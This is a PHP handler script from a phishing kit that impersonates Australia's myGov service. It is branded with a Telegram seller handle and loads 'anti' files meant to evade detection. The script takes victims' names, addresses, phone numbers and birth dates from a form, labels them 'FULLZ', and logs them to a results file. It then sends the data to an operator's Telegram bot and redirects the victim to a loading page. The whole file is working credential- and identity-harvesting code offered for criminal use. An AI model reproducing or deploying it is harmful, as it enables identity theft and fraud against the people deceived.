<?php
/*
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⠆⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⢤⣴⠟⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣄⠐⠟⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠺⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⠟⢁⣴⣷⣦⣤⣤⣤⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡿⠛⡆⠀⠉⠛⠻⠿⠿⠿⠇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣿⡷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⣴⣿⡦⠀⢻⣷⠀⠀⠀t.me/BigDan_T00LS⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⣿⣿⡿⠁⠀⠘⠋⠀  wa.me/message/MIEE56RRIQU5C1
⠀⠀⠀⣰⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠻⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠀⠀         ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
*/



include "../../anti/anti1.php";
include "../../anti/anti2.php"; 
include "../../anti/anti3.php"; 
include "../../anti/anti4.php"; 
include "../../anti/anti5.php"; 
include "../../anti/anti7.php";


include "../../admin/config.php";
$chatId = trim(file_get_contents("../../admin/config/chatId.ini"));
$botUrl = trim(file_get_contents("../../admin/config/botUrl.ini"));
$telegram = trim(file_get_contents("../../admin/config/status_telegram.ini"));
$discord = trim(file_get_contents("../../admin/config/status_discord.ini"));
$webhookUrl = trim(file_get_contents("../../admin/config/discord.ini"));
extract($_REQUEST);
$file1 = fopen("../../results/logins.txt", "a");
fwrite($file1, $firstname .":". $lastname .":". $address1 .":". $address2 .":". $city .":". $state .":". $zipcode .":". $phonee.":". $birthday );
fwrite($file1, "\n");
fclose($file1);

$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$message = "[link: $link ]\r\n";

$file = fopen("Mygov.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");


$file1 = fopen("../../results/logins.txt", "a");


fwrite($file1,"[t.me/BigDan_T00LS][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][t.me/BigDan_T00LS] ". "\n");
fwrite($file1, " ##### ONLINE ACCESSS 🔐 #### ". "\n");
fwrite($file1, "> First Name: ");
fwrite($file1, $firstname. "\n");
fwrite($file1, "> Last Name: ");
fwrite($file1, $lastname. "\n");
fwrite($file1, "> Address1: ");
fwrite($file1, $address1. "\n");
fwrite($file1, "> Address2: ");
fwrite($file1, $address2. "\n");
fwrite($file1, "> City: ");
fwrite($file1, $city. "\n");
fwrite($file1, "> State: ");
fwrite($file1, $state. "\n");
fwrite($file1, "> Zipcode: ");
fwrite($file1, $zipcode. "\n");
fwrite($file1, "> Phone Num: ");
fwrite($file1, $phonee. "\n");
fwrite($file1, "> Date of Birth: ");
fwrite($file1, $birthday. "\n");
fwrite($file1, " ##### ENDS HERE 🔐#### ". "\n");
fwrite($file1,"[t.me/BigDan_T00LS][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][t.me/BigDan_T00LS] ". "\n");

fwrite($file1, "\n");
fclose($file1);

$FN = $_POST["firstname"];
$LN = $_POST["lastname"];
$A1 = $_POST["address1"];
$A2 = $_POST["address2"];
$CY = $_POST["city"];
$ST = $_POST["state"];
$ZC = $_POST["zipcode"];
$PH = $_POST["phonee"];
$BD = $_POST["birthday"];



$data = "[t.me/BigDan_T00LS][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][t.me/BigDan_T00LS] \n $message 
< FULLZ  I N F O >🔐\n > First Name: $FN \n > Last Name: $LN \n > Address1: $A1 \n > Address2: $A2 \n > City: $CY \n > State: $ST \n > Zipcode: $ZC \n > Phone Number: $PH \n > BirthDay: $BD \n ";

// Telegram send function
$txt = $data;
if ($telegram == "on"){
    $send = ['chat_id'=>$chatId,'text'=>$txt];
    $web_telegram = "https://api.telegram.org/{$botUrl}";
    $ch = curl_init($web_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
}





HEADER("Location: ../loading.php");







?>

